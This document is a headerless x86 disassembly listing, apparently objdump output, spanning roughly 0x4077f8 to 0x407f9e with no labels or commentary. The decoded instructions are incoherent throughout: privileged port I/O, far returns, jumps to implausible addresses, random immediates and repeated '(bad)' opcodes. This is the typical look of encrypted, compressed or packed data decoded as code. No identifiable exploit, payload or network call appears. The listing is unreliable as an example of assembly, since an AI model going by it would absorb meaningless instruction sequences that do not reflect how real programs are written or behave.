  4077f8:	in     eax,dx
  4077f9:	sahf   
  4077fa:	or     DWORD PTR [esi+0x39],0x30
  4077fe:	push   ecx
  4077ff:	mov    ah,bh
  407801:	int    0x8d
  407803:	dec    eax
  407804:	lods   eax,DWORD PTR cs:[si]
  407807:	xor    al,0x95
  407809:	sub    eax,0x7fc5d25b
  40780e:	aad    0x4d
  407810:	out    dx,al
  407811:	lds    edi,FWORD PTR [edx]
  407813:	es aad 0x72
  407816:	inc    eax
  407817:	push   es
  407818:	inc    edx
  407819:	cli    
  40781a:	retf   
  40781b:	sti    
  40781c:	leave  
  40781d:	sbb    cl,cl
  40781f:	sub    BYTE PTR ds:0x6ffba33f,0x4
  407826:	test   al,0x68
  407828:	mov    ecx,0x82fc5445
  40782d:	cdq    
  40782e:	scas   eax,DWORD PTR es:[edi]
  40782f:	mov    ebp,0x49cf93e3
  407834:	mov    dl,0xd
  407836:	aad    0x61
  407838:	ror    BYTE PTR ds:0xa5d6b3e8,1
  40783e:	lock aad 0x11
  407841:	mov    bl,0x46
  407843:	jbe    0x407834
  407845:	cmp    edi,DWORD PTR ss:[edi-0x4]
  407849:	out    0xa7,al
  40784b:	sbb    al,0xe6
  40784d:	jbe    0x407850
  40784f:	aaa    
  407850:	and    dl,dl
  407852:	cmovne ecx,DWORD PTR [edx]
  407855:	and    BYTE PTR [eax+ebx*4+0x27e22244],dl
  40785c:	gs aaa 
  40785e:	xor    ch,BYTE PTR [eax]
  407860:	dec    ebx
  407861:	mov    dl,0xa0
  407863:	nop
  407864:	loopne 0x40782e
  407866:	(bad)  
  407867:	outs   dx,BYTE PTR ds:[esi]
  407868:	jge    0x4078b0
  40786a:	push   ebx
  40786b:	cmp    al,0xdd
  40786d:	rcl    edx,cl
  40786f:	fnsave [eax+0x79]
  407872:	or     eax,0xd846090c
  407877:	enter  0x763c,0x1c
  40787b:	push   esp
  40787c:	mov    ds:0x51d6af32,al
  407881:	lss    esi,FWORD PTR [esi]
  407884:	push   esi
  407885:	fisub  WORD PTR [edx-0x4a0f7d03]
  40788b:	ror    bh,1
  40788d:	add    DWORD PTR [ebx-0x53e419d9],0xd0e29905
  407897:	cmp    bl,BYTE PTR [edx-0x55]
  40789a:	test   DWORD PTR [esi+0x4c],edx
  40789d:	inc    ebx
  40789e:	xor    DWORD PTR [edx],edi
  4078a0:	xchg   edi,eax
  4078a1:	push   esi
  4078a2:	das    
  4078a3:	jo     0x407879
  4078a5:	loopne 0x407862
  4078a7:	sbb    al,0x53
  4078a9:	outs   dx,BYTE PTR ds:[esi]
  4078aa:	mov    ds,eax
  4078ac:	mov    WORD PTR [ebx-0x4bc60d7d],cs
  4078b2:	stc    
  4078b3:	aaa    
  4078b4:	imul   esp,esp,0xd401f623
  4078ba:	jo     0x4078b2
  4078bc:	popa   
  4078bd:	mov    ds:0x76daa147,eax
  4078c2:	(bad)  
  4078c4:	push   0xee65af10
  4078c9:	(bad)  
  4078ca:	mov    eax,?
  4078cc:	cld    
  4078cd:	(bad)  
  4078ce:	hlt    
  4078cf:	iret   
  4078d0:	sahf   
  4078d1:	xor    DWORD PTR [ebx],0x2fc42c03
  4078d7:	pop    esi
  4078d8:	adc    BYTE PTR [ebp+ebp*8-0x5788dac7],0x2e
  4078e0:	scas   al,BYTE PTR es:[edi]
  4078e1:	dec    esi
  4078e2:	mov    BYTE PTR [edx+ebx*1-0x6108aa4c],bl
  4078e9:	or     BYTE PTR [ecx],cl
  4078eb:	xlat   BYTE PTR ds:[ebx]
  4078ec:	mov    ch,0x69
  4078ee:	cmp    dl,BYTE PTR [ebx+0x75]
  4078f1:	mov    edi,0xe1d47ee2
  4078f6:	out    dx,al
  4078f7:	popa   
  4078f8:	pop    esi
  4078f9:	jae    0x4078a6
  4078fb:	pop    ebx
  4078fc:	popa   
  4078fd:	mov    al,ds:0x9d543fbf
  407902:	mov    bh,ch
  407904:	loope  0x407912
  407906:	fmul   st(1),st
  407908:	stos   BYTE PTR es:[edi],al
  407909:	iret   
  40790a:	aam    0xe6
  40790c:	addr16 mov al,ds:0x9d4d
  407910:	fldenv [edx-0x3d]
  407913:	aad    0xf4
  407915:	lahf   
  407916:	mov    ds:0xe7f239fc,al
  40791b:	cwde   
  40791c:	mul    DWORD PTR [eax]
  40791e:	jle    0x407984
  407920:	push   0x74
  407922:	out    0xf4,eax
  407924:	inc    ebp
  407925:	out    dx,al
  407926:	sub    eax,0x968c023c
  40792b:	pop    eax
  40792c:	addr16 add al,0x54
  40792f:	sub    al,0x6f
  407931:	aad    0xe7
  407933:	mov    esi,0xcc235356
  407938:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407939:	lods   eax,DWORD PTR ds:[esi]
  40793a:	cmp    ah,ch
  40793c:	jns    0x9067fbb6
  407942:	scas   eax,DWORD PTR es:[edi]
  407943:	(bad)  
  407944:	std    
  407945:	add    eax,0x45aac1f9
  40794a:	pop    esp
  40794b:	in     al,0xb4
  40794d:	push   0xffffff99
  40794f:	scas   al,BYTE PTR es:[edi]
  407950:	mov    dh,0x61
  407952:	xor    BYTE PTR [edi-0x30412171],dh
  407958:	push   ebp
  407959:	add    esp,DWORD PTR [eax-0x73]
  40795c:	cmp    dh,BYTE PTR [edi+edi*1]
  40795f:	jmp    0x407970
  407961:	xchg   edx,eax
  407962:	sub    al,0x47
  407964:	sbb    BYTE PTR [ecx+0x44],bh
  407967:	bound  esp,QWORD PTR [edi-0x31]
  40796a:	cwde   
  40796b:	arpl   WORD PTR [edi+0x36],dx
  40796e:	mov    al,0xa9
  407970:	rcr    BYTE PTR [ebx*1-0x6747c606],1
  407977:	or     DWORD PTR [esi-0x1efed2b5],eax
  40797d:	cmp    eax,0xf2a39196
  407982:	dec    edx
  407983:	cmp    al,0xe9
  407985:	inc    esi
  407986:	cmp    BYTE PTR [edi-0x5cbbd4c1],ah
  40798c:	inc    ecx
  40798d:	cmp    ch,BYTE PTR [edi]
  40798f:	push   0xffffffcf
  407991:	xchg   BYTE PTR [ebx+0x6],al
  407994:	xchg   DWORD PTR [eax+ecx*2+0x56ee6574],ecx
  40799b:	ror    ch,0x38
  40799e:	sbb    al,0xbb
  4079a0:	je     0x407a1b
  4079a2:	inc    ecx
  4079a3:	jecxz  0x4079c8
  4079a5:	xor    DWORD PTR [eax+0x19],0x5476eb5d
  4079ac:	mul    BYTE PTR [edx-0x5cad150b]
  4079b2:	inc    eax
  4079b3:	xchg   esp,eax
  4079b4:	ins    BYTE PTR es:[edi],dx
  4079b5:	mov    dl,0x24
  4079b7:	lods   eax,DWORD PTR ds:[esi]
  4079b8:	pop    es
  4079b9:	sar    BYTE PTR [edx],cl
  4079bb:	test   al,0x9c
  4079bd:	les    eax,FWORD PTR [eax-0x17fb38f5]
  4079c3:	mov    ds:0xa2f07f7a,al
  4079c8:	sbb    ecx,DWORD PTR [ecx+eax*8-0xc]
  4079cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079cd:	ss adc eax,0xe117a04a
  4079d3:	cmp    edi,DWORD PTR [edx+0x2150cf5b]
  4079d9:	mov    dh,0x58
  4079db:	cmp    edi,DWORD PTR [edx]
  4079dd:	sub    al,0x18
  4079df:	jg     0x407973
  4079e1:	loope  0x407a4a
  4079e3:	es xchg edx,eax
  4079e5:	mov    ebp,DWORD PTR [esi-0x5d9012ea]
  4079eb:	sbb    ah,BYTE PTR [esi]
  4079ed:	(bad)  
  4079ee:	jne    0x407a04
  4079f0:	lds    edx,FWORD PTR [eax-0x5d0462a]
  4079f6:	ins    BYTE PTR es:[edi],dx
  4079f7:	mov    eax,ds:0x3a078aa5
  4079fc:	cmp    DWORD PTR [ebx],esi
  4079fe:	xchg   edx,eax
  4079ff:	pop    ebp
  407a00:	cmc    
  407a01:	push   edx
  407a02:	add    DWORD PTR [ebp+0x6269dd64],eax
  407a08:	in     eax,0x6
  407a0a:	jnp    0xdf945c9f
  407a10:	pop    edx
  407a11:	cmp    al,0x4d
  407a13:	jmp    0x407a86
  407a15:	fcmovbe st,st(6)
  407a17:	(bad)  [eax]
  407a19:	repnz cwde 
  407a1b:	clc    
  407a1c:	cld    
  407a1d:	push   ds
  407a1e:	mov    ds:0xce6c52f,eax
  407a23:	xor    BYTE PTR [ebp-0x9],cl
  407a26:	pop    ebp
  407a27:	mov    dh,0x90
  407a29:	jmp    0x645b9ead
  407a2e:	add    bh,bl
  407a30:	test   al,0x75
  407a32:	pusha  
  407a33:	adc    eax,0xbe38cf22
  407a38:	jns    0x4079c1
  407a3a:	inc    esi
  407a3b:	jb     0x407a4c
  407a3d:	jle    0x4079dc
  407a3f:	adc    bh,BYTE PTR [ecx-0xc8acafd]
  407a45:	inc    esi
  407a46:	jge    0x407a1c
  407a48:	pop    esi
  407a49:	and    al,0x73
  407a4b:	jno    0x4079ec
  407a4d:	add    eax,0xba5fddad
  407a52:	retf   0xfc9b
  407a55:	pop    edi
  407a56:	dec    esi
  407a57:	cs inc ecx
  407a59:	dec    esi
  407a5a:	fisub  WORD PTR [edi-0x69]
  407a5d:	scas   al,BYTE PTR es:[edi]
  407a5e:	cld    
  407a5f:	mov    ebx,ecx
  407a61:	fldenv [esi+0x6a]
  407a64:	inc    ebp
  407a65:	mov    al,0xcc
  407a67:	and    eax,0xfbb31c75
  407a6c:	fld    QWORD PTR [esi]
  407a6e:	mov    dh,BYTE PTR [ebp+0x713786b7]
  407a74:	in     al,dx
  407a75:	xchg   BYTE PTR [esi],cl
  407a77:	adc    bh,BYTE PTR [bx+si]
  407a7a:	shl    BYTE PTR [edx],cl
  407a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a7d:	repnz bound eax,QWORD PTR [ecx+0x4c1736d2]
  407a84:	(bad)  
  407a85:	xor    DWORD PTR [esi],ebp
  407a87:	xor    eax,0x119b7d18
  407a8c:	enter  0x38f0,0xfa
  407a90:	scas   al,BYTE PTR es:[edi]
  407a91:	(bad)  
  407a93:	adc    BYTE PTR [eax],dh
  407a95:	xor    eax,0x9c330837
  407a9a:	push   edx
  407a9b:	pop    es
  407a9c:	leave  
  407a9d:	out    dx,eax
  407a9e:	into   
  407a9f:	push   es
  407aa0:	fwait
  407aa1:	das    
  407aa2:	adc    ebx,edi
  407aa4:	addr16 xchg ebx,eax
  407aa6:	sar    ch,0x6
  407aa9:	lock jbe 0x407a6c
  407aac:	outs   dx,BYTE PTR ds:[esi]
  407aad:	fldcw  WORD PTR [ebx-0x75a1c273]
  407ab3:	and    DWORD PTR [edx],0x41
  407ab6:	push   esi
  407ab7:	inc    eax
  407ab8:	in     eax,dx
  407ab9:	ds dec ebx
  407abb:	loope  0x407a69
  407abd:	pusha  
  407abe:	push   edx
  407abf:	sbb    DWORD PTR [ebx+0x3c580e06],edx
  407ac5:	or     DWORD PTR [ebp-0x2cf9c7e8],ecx
  407acb:	in     al,0xa9
  407acd:	rcr    BYTE PTR [ecx+edi*2],1
  407ad0:	push   eax
  407ad1:	loope  0x407b04
  407ad3:	sbb    eax,0x4e36d702
  407ad8:	push   ss
  407ad9:	add    esi,0x76be772
  407adf:	repz into 
  407ae1:	clc    
  407ae2:	fisubr DWORD PTR [ecx]
  407ae4:	and    edx,DWORD PTR [edx+0x36962dc4]
  407aea:	or     BYTE PTR [eax-0x5832fa4a],bl
  407af0:	mov    BYTE PTR [ebx],bh
  407af2:	sbb    DWORD PTR [edx],eax
  407af4:	jmp    0x407b01
  407af6:	shr    bh,1
  407af8:	xor    al,BYTE PTR [ecx+ebx*4]
  407afb:	pop    ebp
  407afc:	into   
  407afd:	push   esi
  407afe:	cmp    al,BYTE PTR gs:[esi-0x3909ff02]
  407b05:	aaa    
  407b06:	ja     0x407ae4
  407b08:	mov    al,0x0
  407b0a:	dec    ebp
  407b0b:	xor    BYTE PTR [ebp-0x7e],al
  407b0e:	cmp    al,0x3f
  407b10:	lea    esp,[eax-0x5e]
  407b13:	xchg   ebx,eax
  407b14:	inc    edi
  407b15:	int3   
  407b16:	pop    ecx
  407b17:	aam    0xba
  407b19:	push   ebx
  407b1a:	jl     0x407a9f
  407b1c:	push   cs
  407b1d:	mov    eax,ds:0xee6d824f
  407b22:	push   esp
  407b23:	sbb    al,0xaa
  407b25:	mov    eax,ds:0x5c2f8187
  407b2a:	mov    cl,0x6b
  407b2c:	sub    DWORD PTR [edx-0x5d8ae77a],esi
  407b32:	aad    0x8c
  407b34:	adc    DWORD PTR [esi+0xcacb8fe],ebx
  407b3a:	push   es
  407b3b:	dec    edx
  407b3c:	lea    ebx,[ebx-0x32]
  407b3f:	mov    ecx,0x8b1adaef
  407b44:	mov    bh,0x7b
  407b46:	pop    ebx
  407b47:	mov    ebx,0x6aa1be71
  407b4c:	sub    DWORD PTR [ebx+0x7d],esi
  407b4f:	mov    eax,ds:0xefd984ad
  407b54:	jecxz  0x407b8f
  407b56:	xor    esi,DWORD PTR [esi+0x20]
  407b59:	jle    0x407b2a
  407b5b:	and    eax,0x9c5c3042
  407b60:	ret    0xe6d
  407b63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b64:	sbb    al,0x35
  407b66:	jb     0x407af9
  407b68:	retf   
  407b69:	aam    0xea
  407b6b:	pushf  
  407b6c:	pop    ebp
  407b6d:	out    dx,eax
  407b6e:	add    al,0xb6
  407b70:	retf   
  407b71:	out    0x86,eax
  407b73:	jae    0x407be3
  407b75:	mov    ecx,0xd37683c2
  407b7a:	sahf   
  407b7b:	mov    DWORD PTR [edi-0x7943b527],ecx
  407b81:	dec    ebx
  407b82:	fild   QWORD PTR [ebx+0x76]
  407b85:	and    ebp,DWORD PTR [edx+0x7a]
  407b88:	in     eax,dx
  407b89:	les    esp,FWORD PTR [esi]
  407b8b:	cld    
  407b8c:	stc    
  407b8d:	add    BYTE PTR [eax],0x5b
  407b90:	es shl ecx,cl
  407b93:	push   0xc0bd44cb
  407b98:	mov    al,0x27
  407b9a:	js     0x407be0
  407b9c:	outs   dx,BYTE PTR ds:[esi]
  407b9d:	sub    BYTE PTR [edi+0x53],dh
  407ba0:	inc    eax
  407ba1:	jp     0x407bc1
  407ba3:	jo     0x407bc5
  407ba5:	pop    edx
  407ba6:	jo     0x407b6b
  407ba8:	frstpm(287 only) 
  407baa:	imul   edx,eax,0x8391741a
  407bb0:	inc    edi
  407bb1:	dec    esp
  407bb2:	sbb    al,BYTE PTR [eax]
  407bb4:	sbb    DWORD PTR [ebx+0x7e],esi
  407bb7:	fmul   st(3),st
  407bb9:	xchg   esp,eax
  407bba:	hlt    
  407bbb:	je     0x407b57
  407bbd:	pop    edx
  407bbe:	sub    BYTE PTR [esi+0x1f],dl
  407bc1:	in     eax,0x68
  407bc3:	cli    
  407bc4:	or     edx,DWORD PTR ds:0x334b5d69
  407bca:	lea    ebx,[edx+0x58]
  407bcd:	mov    bl,0xea
  407bcf:	cmp    DWORD PTR [edi-0x6d],esp
  407bd2:	pop    esp
  407bd3:	mov    ch,0xac
  407bd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bd6:	jae    0x407c24
  407bd8:	push   cs
  407bd9:	call   0xc83ab531
  407bde:	mov    bl,BYTE PTR [edi-0x59]
  407be1:	stos   DWORD PTR es:[edi],eax
  407be2:	loop   0x407bed
  407be4:	sub    eax,0xd36956bf
  407be9:	mov    al,0xdf
  407beb:	cmp    edx,DWORD PTR [edx+edi*8-0x4e]
  407bef:	aaa    
  407bf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bf1:	push   eax
  407bf2:	adc    BYTE PTR [edi],al
  407bf4:	loop   0x407c46
  407bf6:	out    0x17,eax
  407bf8:	fwait
  407bf9:	inc    esp
  407bfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bfb:	pop    es
  407bfc:	jecxz  0x407bbd
  407bfe:	stc    
  407bff:	cdq    
  407c00:	pop    ss
  407c01:	mov    dl,0x80
  407c03:	idiv   DWORD PTR [ecx+ebx*1+0x3c]
  407c07:	xor    eax,DWORD PTR [esi]
  407c09:	and    ebp,DWORD PTR [eax]
  407c0b:	sbb    al,0x11
  407c0d:	xor    al,0x93
  407c0f:	pushf  
  407c10:	fdiv   QWORD PTR [eax-0x5a]
  407c13:	jnp    0x407c0f
  407c15:	cwde   
  407c16:	mov    esi,eax
  407c18:	retf   0xb9d9
  407c1b:	mov    WORD PTR [eax+0x50d48c89],es
  407c21:	jp     0x407c09
  407c23:	jmp    0xb01c8698
  407c28:	jl     0x407bcd
  407c2a:	pop    esi
  407c2b:	sbb    dl,BYTE PTR [ebx-0x59]
  407c2e:	fsubr  DWORD PTR ds:0xccfa9f1c
  407c34:	dec    esi
  407c35:	mov    esi,0xcb9f815a
  407c3a:	les    esi,FWORD PTR [eax+0x2d053b5c]
  407c40:	aaa    
  407c41:	fidivr DWORD PTR [edx-0x33]
  407c44:	mov    edi,eax
  407c46:	dec    esp
  407c47:	loopne 0x407c81
  407c49:	dec    esi
  407c4a:	fwait
  407c4b:	mov    eax,DWORD PTR [ebp-0x65]
  407c4e:	add    eax,0x9592f6d4
  407c53:	or     bl,dl
  407c55:	ret    
  407c56:	mov    ebx,0xc55eade6
  407c5b:	dec    edi
  407c5c:	out    0x98,eax
  407c5e:	out    0xc2,al
  407c60:	mov    ebp,0x6b554272
  407c65:	and    dl,dh
  407c67:	jmp    0x407c33
  407c69:	pop    ds
  407c6a:	jo     0x407bfc
  407c6c:	push   cs
  407c6d:	mov    bh,0x1e
  407c6f:	add    dl,dh
  407c71:	push   0x4
  407c73:	rcl    BYTE PTR [edx+0x69],1
  407c76:	mov    edi,0x3afd1940
  407c7b:	sub    ebp,ebx
  407c7d:	mov    eax,0xe94dd55e
  407c82:	mov    eax,DWORD PTR [ecx+esi*1+0xe]
  407c86:	outs   dx,DWORD PTR ds:[esi]
  407c87:	xor    ah,BYTE PTR [eax-0x2fac5623]
  407c8d:	scas   eax,DWORD PTR es:[edi]
  407c8e:	ja     0x407cfd
  407c90:	add    BYTE PTR [eax+0x7a],bh
  407c93:	outs   dx,DWORD PTR ds:[esi]
  407c94:	je     0x407cc9
  407c96:	fdiv   st,st(2)
  407c98:	call   0xb6df:0x825e2ea4
  407c9f:	pop    ebx
  407ca0:	pop    ebx
  407ca1:	jo     0x407cc5
  407ca3:	mov    ah,0xfb
  407ca5:	(bad)
  407ca9:	out    dx,al
  407caa:	xchg   edx,eax
  407cab:	mov    ah,0x58
  407cad:	adc    eax,0xb5d12121
  407cb2:	xchg   esp,eax
  407cb4:	xchg   esi,eax
  407cb5:	jmp    0xdf10f44f
  407cba:	outs   dx,DWORD PTR ds:[esi]
  407cbb:	ficomp DWORD PTR [eax]
  407cbd:	jle    0x407c90
  407cbf:	sbb    eax,0xeb5f6471
  407cc4:	cmc    
  407cc5:	repz add esp,DWORD PTR [ebp+0x3a3cccb1]
  407ccc:	dec    eax
  407ccd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cce:	(bad)  
  407ccf:	es lock test eax,0xd7a9f370
  407cd6:	or     al,0xf6
  407cd8:	aad    0x86
  407cda:	inc    edx
  407cdb:	addr16 adc eax,0xf1caff99
  407ce1:	fsubr  QWORD PTR [ebx+0x3dc4e336]
  407ce7:	adc    edx,0x13
  407cea:	adc    ecx,DWORD PTR [esi+ebp*1]
  407ced:	sbb    BYTE PTR [eax-0x721befa3],0xdf
  407cf4:	mov    edx,esp
  407cf6:	lds    esp,FWORD PTR [ebx]
  407cf8:	sub    esp,DWORD PTR [edi]
  407cfa:	les    esp,FWORD PTR [ebx]
  407cfc:	mov    esp,0xea6702fa
  407d01:	and    cl,BYTE PTR [edx]
  407d03:	lods   al,BYTE PTR ds:[esi]
  407d04:	lds    ecx,FWORD PTR [ebx]
  407d06:	mov    eax,eax
  407d08:	test   al,0x3
  407d0a:	push   esp
  407d0b:	into   
  407d0c:	or     DWORD PTR [ebp-0x62],0x9c385366
  407d13:	add    eax,0x3b31f79a
  407d18:	aad    0xa
  407d1a:	gs push cs
  407d1c:	shl    DWORD PTR [edi+0x44b02213],0x1f
  407d23:	mov    ah,0xe5
  407d25:	mov    cl,ah
  407d27:	push   ss
  407d28:	lock neg BYTE PTR [esi-0x4d]
  407d2c:	inc    ecx
  407d2d:	or     ebx,esi
  407d2f:	cmp    bh,al
  407d31:	scas   eax,DWORD PTR es:[edi]
  407d32:	inc    esi
  407d33:	sub    eax,DWORD PTR [esi+0x30]
  407d36:	sub    al,0x2b
  407d38:	loop   0x407d4b
  407d3a:	nop
  407d3b:	shl    BYTE PTR [edx-0x32],0x9f
  407d3f:	inc    ebx
  407d40:	adc    BYTE PTR [ebp+0x4e4358a9],bh
  407d46:	pusha  
  407d47:	mov    esp,0xf3ee45a1
  407d4c:	xlat   BYTE PTR ds:[ebx]
  407d4d:	add    DWORD PTR [ebp-0x3464617a],0x38c0fa58
  407d57:	xchg   BYTE PTR [edx-0x4b4eb4bc],cl
  407d5d:	mul    DWORD PTR [edx+0x351d3f2a]
  407d63:	in     eax,0x52
  407d65:	loopne 0x407d8d
  407d67:	fs xchg edi,eax
  407d69:	cmp    eax,0xa3bb8b25
  407d6e:	retf   0x7b92
  407d71:	inc    edx
  407d72:	(bad)  
  407d73:	adc    dl,dh
  407d75:	sbb    al,0x61
  407d77:	(bad)  
  407d78:	or     eax,0x2a6f7606
  407d7d:	inc    ebp
  407d7e:	dec    esi
  407d7f:	imul   esp,DWORD PTR ds:0x95abc046,0xc9331374
  407d89:	mov    ds:0x7d2d7b21,al
  407d8e:	fmulp  st(4),st
  407d90:	dec    esp
  407d91:	mov    cl,0x59
  407d93:	mov    bh,0x6
  407d95:	or     al,BYTE PTR [edi-0x4]
  407d98:	loopne 0x407d1a
  407d9a:	jg     0x407d3c
  407d9c:	sbb    bl,BYTE PTR [ecx+0x9]
  407d9f:	pushf  
  407da0:	int    0xac
  407da2:	jmp    0x407d61
  407da4:	int3   
  407da5:	lods   eax,DWORD PTR ds:[esi]
  407da6:	push   edi
  407da7:	ss pop eax
  407da9:	push   0x12
  407dab:	aam    0xd4
  407dad:	mov    dh,0xdf
  407daf:	xchg   edx,eax
  407db0:	inc    eax
  407db1:	lods   eax,DWORD PTR ds:[esi]
  407db2:	test   al,0xe9
  407db4:	int3   
  407db5:	fnstsw WORD PTR [eax+0x327f8ce]
  407dbb:	ror    BYTE PTR [ebx],0x58
  407dbe:	dec    eax
  407dbf:	in     eax,0xea
  407dc1:	lds    ecx,FWORD PTR [esi+0x272e3abf]
  407dc7:	push   0xae69c8a0
  407dcc:	inc    eax
  407dcd:	and    eax,0xb77b7fc
  407dd2:	xchg   esp,eax
  407dd3:	add    DWORD PTR [edi],0xc56037c1
  407dd9:	xchg   ecx,eax
  407dda:	cmc    
  407ddb:	xor    esi,DWORD PTR [esi]
  407ddd:	xchg   BYTE PTR [ecx+0x79],al
  407de0:	adc    dl,BYTE PTR [eax-0x61954ad0]
  407de6:	mov    BYTE PTR [edx+0x66b1d287],ah
  407dec:	inc    eax
  407ded:	mul    ecx
  407def:	repz cwde 
  407df1:	sub    BYTE PTR [ecx+0x46],bl
  407df4:	cmp    dh,BYTE PTR [edx+0x66241a05]
  407dfa:	xchg   ebp,eax
  407dfb:	lahf   
  407dfc:	shl    edi,0x71
  407dff:	ret    0xe668
  407e02:	cld    
  407e03:	aad    0x73
  407e05:	imul   edx,DWORD PTR [eax-0x179013de],0xffffffa5
  407e0c:	sub    al,0xba
  407e0e:	ja     0x407e56
  407e10:	mov    BYTE PTR [ebx],dh
  407e12:	enter  0x7977,0xdc
  407e16:	stos   BYTE PTR es:[edi],al
  407e17:	ficomp WORD PTR [edx-0x40]
  407e1a:	xchg   esp,eax
  407e1b:	mov    esi,DWORD PTR [ebp+eiz*8-0x2647e9e1]
  407e22:	(bad)  
  407e23:	adc    ecx,esp
  407e25:	add    edx,DWORD PTR [ebx]
  407e27:	xchg   ebx,eax
  407e28:	stos   BYTE PTR es:[edi],al
  407e29:	ds nop
  407e2b:	sbb    eax,0xdbf30f67
  407e30:	out    dx,eax
  407e31:	xchg   esi,eax
  407e32:	or     al,0x6f
  407e34:	test   DWORD PTR [ebx-0x7778b1ed],edi
  407e3a:	jnp    0x407e38
  407e3c:	push   ss
  407e3d:	mov    bh,0x28
  407e3f:	jae    0x407e19
  407e41:	xchg   ebx,eax
  407e42:	(bad)  
  407e43:	in     eax,dx
  407e44:	ss loopne 0x407e0c
  407e47:	xorps  xmm0,XMMWORD PTR [edi+ebp*1-0x5b331d3e]
  407e4f:	sub    BYTE PTR [eax+0x70986286],bl
  407e55:	xchg   esp,eax
  407e56:	inc    esi
  407e57:	add    DWORD PTR [ebp+0x42b38918],esi
  407e5d:	fld    QWORD PTR [ebp+0x71]
  407e60:	aas    
  407e61:	ret    0xceb4
  407e64:	mov    bl,BYTE PTR [esi+0x37a312aa]
  407e6a:	iret   
  407e6b:	sbb    DWORD PTR [ebp-0x64],esp
  407e6e:	xor    eax,0x7277aefe
  407e73:	inc    ebp
  407e74:	not    BYTE PTR [ebp*2-0xb69f72]
  407e7b:	adc    dh,BYTE PTR [ebp-0x304cf2bd]
  407e81:	push   ss
  407e82:	mov    edi,0x1228e841
  407e87:	pop    ecx
  407e88:	inc    eax
  407e89:	pop    ecx
  407e8a:	fcmovnu st,st(3)
  407e8c:	sub    BYTE PTR [eax-0x26c4540a],al
  407e92:	nop
  407e93:	jp     0x407e93
  407e95:	mov    dl,0x4b
  407e97:	and    BYTE PTR [ebx],dh
  407e99:	or     al,0xb7
  407e9b:	jecxz  0x407f10
  407e9d:	in     eax,0x91
  407e9f:	gs ss cmp al,0xe
  407ea3:	cli    
  407ea4:	sub    DWORD PTR [esi-0x64],0xffffffbf
  407ea8:	lea    ebx,[edi]
  407eaa:	mov    edi,0xb282550b
  407eaf:	xchg   ecx,esp
  407eb1:	pop    ds
  407eb2:	int    0xf9
  407eb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407eb5:	and    edi,ebp
  407eb7:	xchg   DWORD PTR [ecx-0x6f],edx
  407eba:	xor    cl,dl
  407ebc:	or     eax,0x5e9755fb
  407ec1:	or     ebx,esi
  407ec3:	dec    esi
  407ec4:	lock and edx,edi
  407ec7:	jnp    0x407eec
  407ec9:	mov    bh,0x30
  407ecb:	lds    eax,FWORD PTR [edx]
  407ecd:	xchg   bh,al
  407ecf:	jl     0x407eaa
  407ed1:	retf   
  407ed2:	shr    ecx,1
  407ed4:	add    DWORD PTR [ecx+esi*1-0x17],eax
  407ed8:	arpl   bp,bx
  407eda:	and    BYTE PTR [esi],dl
  407edc:	fisubr WORD PTR [ebx+eiz*2]
  407edf:	pop    ds
  407ee0:	sbb    esi,DWORD PTR [edx+0x66]
  407ee3:	adc    eax,0x9dc584d7
  407ee8:	sbb    eax,0xe298c242
  407eed:	mov    ds:0x29abaf55,al
  407ef2:	mov    ah,0xb5
  407ef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ef5:	cmc    
  407ef6:	sub    ah,BYTE PTR [eax-0x40]
  407ef9:	stos   DWORD PTR es:[edi],eax
  407efa:	shl    BYTE PTR ds:0x12084e65,cl
  407f00:	das    
  407f01:	fwait
  407f02:	jmp    DWORD PTR [eax-0x5]
  407f05:	cdq    
  407f06:	in     al,dx
  407f07:	push   cs
  407f08:	adc    BYTE PTR [edx-0x6d],0xf1
  407f0c:	inc    esi
  407f0d:	outs   dx,BYTE PTR ds:[esi]
  407f0e:	add    dl,dl
  407f10:	pop    esi
  407f11:	push   edx
  407f12:	fwait
  407f13:	jl     0x407f49
  407f15:	and    BYTE PTR [esi],al
  407f17:	push   cs
  407f18:	inc    ebx
  407f19:	jbe    0x407f56
  407f1b:	mov    esi,0xfabc0588
  407f20:	cpuid  
  407f22:	push   ebp
  407f23:	jo     0x407f60
  407f25:	dec    eax
  407f26:	jle    0x407f2d
  407f28:	pop    ss
  407f29:	ficom  WORD PTR [edi]
  407f2b:	or     al,0xdd
  407f2d:	gs pop ss
  407f2f:	push   esp
  407f30:	add    al,0x9d
  407f32:	push   0x70dae922
  407f37:	push   es
  407f38:	push   ss
  407f39:	sbb    al,0xf5
  407f3b:	mov    esp,0x6757ee2c
  407f40:	mov    ch,0x44
  407f42:	jnp    0x407efb
  407f44:	test   DWORD PTR [eax-0x79],ebx
  407f47:	pop    ecx
  407f48:	mov    ds:0x52511b30,eax
  407f4d:	mov    dl,0x0
  407f4f:	fs push esp
  407f51:	rcl    edx,1
  407f53:	inc    ebp
  407f54:	xor    al,0xfd
  407f56:	loopne 0x407f66
  407f58:	addr16 sbb ebx,ecx
  407f5b:	xor    BYTE PTR [ebx+0x3da0b6ca],0xb1
  407f62:	in     eax,0xb
  407f64:	loope  0x407faf
  407f66:	push   esp
  407f67:	stc    
  407f68:	into   
  407f69:	pop    esi
  407f6a:	xchg   esp,eax
  407f6b:	add    cl,BYTE PTR [esi+0x56]
  407f6e:	inc    esp
  407f6f:	dec    edx
  407f70:	lahf   
  407f71:	xchg   edi,eax
  407f72:	repnz ss in al,0x87
  407f76:	packsswb mm7,mm1
  407f79:	imul   edx,DWORD PTR [eax+0x63bdeca1],0xffffffcc
  407f80:	repz scas al,BYTE PTR es:[edi]
  407f82:	inc    ebp
  407f83:	mov    esi,0x73437b15
  407f88:	push   edx
  407f89:	mov    BYTE PTR [ebp-0x6c],dl
  407f8c:	xor    ah,al
  407f8e:	mov    ebx,0xa767ae5a
  407f93:	dec    ebp
  407f94:	nop
  407f95:	xor    esp,DWORD PTR [ebx-0x5cf5e4c7]
  407f9b:	fistp  QWORD PTR [eax]
  407f9d:	stos   DWORD PTR es:[edi],eax
  407f9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
